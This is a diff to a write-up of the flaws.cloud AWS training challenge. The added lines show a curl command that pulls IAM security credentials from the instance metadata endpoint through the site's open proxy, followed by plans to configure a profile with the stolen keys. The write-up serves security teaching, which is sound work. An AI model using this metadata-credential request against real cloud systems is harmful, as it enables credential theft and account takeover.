@@ -39,12 +39,16 @@ After trying the said Magic IP we are able to list the instance metadata
 `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/`
 
 I also transitioned to curl for easier enumeration I can just press the up arrow in my keyboard and then type there faster, and while enumerating I found this access keys
+```
+┌──(aaron㉿kali)-[~]
+└─$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
 
+```
 <kbd>
-![image](https://github.com/user-attachments/assets/f859aeec-035c-429d-872c-3bcfa8290d1b)
+![image](https://github.com/user-attachments/assets/2469a361-c544-4827-8b58-9bcc5404300f)
 </kbd>
 
-We will use this access key, going back to my terminal and to set up a new profile, I used the comand below
+We can use this key to check what access we have, we will create another profile for this access, I used the comand below
 
 ```
 ┌──(aaron㉿kali)-[~/flaws/level6]
